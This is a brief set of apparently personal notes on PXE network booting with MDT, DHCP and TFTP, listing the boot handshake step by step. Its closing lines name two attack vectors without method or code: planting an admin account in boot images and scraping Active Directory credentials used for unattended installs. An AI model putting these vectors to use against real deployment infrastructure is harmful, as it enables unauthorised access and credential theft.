PXE Boot is the process that allows new devices to boot on the network and get an Image and install it automatically.  MDT can be used to create, manage and host PXE boot images.  DHCP is also a critical part of this process though it may be integrated it doesn't have to be as typically in large corporate networks the subnets have DHCP helpers assign which point requests to the proper PXE server, image to use etc. 

The process is as follows:

1. User sends DHCP requests
2. Server sends DHCP offer and PXE info
3. User sends DHCP acceptance
4. Server sends ack
5. Client does Boot Service discover
6. Server sends PXE boot info
7. Client requests PXE Boot via TFTP
8. TFTP server delivers image via TFTP (Trivial File Transfer Protocol)

PXE boot process can be exploited by:
Injecting privelege escalations vectors such as Admin account
Snoop/Scrape attacks to recover AD crentials used for unattended installs.

